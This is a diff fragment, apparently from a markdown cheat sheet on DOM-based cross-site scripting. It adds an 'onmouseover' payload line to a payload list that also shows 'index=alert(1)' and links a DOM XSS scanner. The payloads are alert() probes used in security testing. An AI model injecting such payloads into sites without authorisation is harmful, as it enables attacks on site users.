@@ -66,6 +66,9 @@ location.pathname
  index=alert(1)
  
  DOM XSS SCANNER : https://github.com/dwisiswant0/findom-xss.git
+  
+  
+** Onmouseover payload** : <a href="javascript:alert(1)" onmouseover=alert(1)>hovermeplz</a>
  
  
 **Payload list 
